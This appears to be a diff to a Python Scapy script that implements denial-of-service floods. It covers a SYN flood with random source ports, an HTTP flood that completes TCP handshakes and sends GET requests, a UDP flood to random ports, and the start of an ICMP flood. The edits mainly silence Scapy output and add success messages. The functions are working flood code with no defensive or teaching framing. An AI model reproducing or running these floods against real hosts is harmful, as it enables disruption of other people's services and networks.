@@ -69,11 +69,11 @@ def SynFlood(dstIP,dstPort,repeat):
         IP_Packet.dst = dstIP
 
         TCP_Packet = TCP()
-        TCP_Packet.sport = randomPort() # default port : 20
+        TCP_Packet.sport = randomPort() 
         TCP_Packet.dport = dstPort
         TCP_Packet.flags = "S"
-
-        send(IP_Packet/TCP_Packet,verbose=0)
+        send(IP_Packet/TCP_Packet,verbose=False)
+        print("-"*35 + "SYN Packet is Successfuly sended"+35*"-"+"\n")
 
 def HTTPFlood(dstIP,dstPort,repeat):
     for x in range(repeat):
@@ -88,7 +88,7 @@ def HTTPFlood(dstIP,dstPort,repeat):
             TCP_Packet.flags="S"
             
             syn = IP_Packet/TCP_Packet
-            packet_SynAck = sr1(syn,timeout=1)
+            packet_SynAck = sr1(syn,timeout=1,verbose=False)
             
             if(packet_SynAck is None):
                 print("-"*35 + "ACK+SYN Packet is Filtered"+35*"-"+"\n")
@@ -98,7 +98,8 @@ def HTTPFlood(dstIP,dstPort,repeat):
             TCP_Packet.ack= packet_SynAck[TCP].seq+1
             getStr='GET / HTTP/1.0\n\n'
 
-            send(IP_Packet/TCP_Packet/getStr)
+            send(IP_Packet/TCP_Packet/getStr,verbose=False)
+            print("-"*35 + "HTTP Packet is Successfuly sended"+35*"-"+"\n")
         except:
             print("-"*35 + "Error Occured during Sending packets"+35*"-"+"\n")
 
@@ -110,7 +111,8 @@ def UDPFlood(dstIP,dstPort,repeat):
 
         UDP_Packet = UDP()
         UDP_Packet.dport = randomPort()
-        send(IP_Packet/UDP_Packet/Raw(load=data))
+        send(IP_Packet/UDP_Packet/Raw(load=data),verbose=False)
+        print("-"*35 + "UDP Packet is Successfuly sended"+35*"-"+"\n")
 
 def ICMPFlood(dstIP,dstPort,repeat):
     for x in range(repeat):
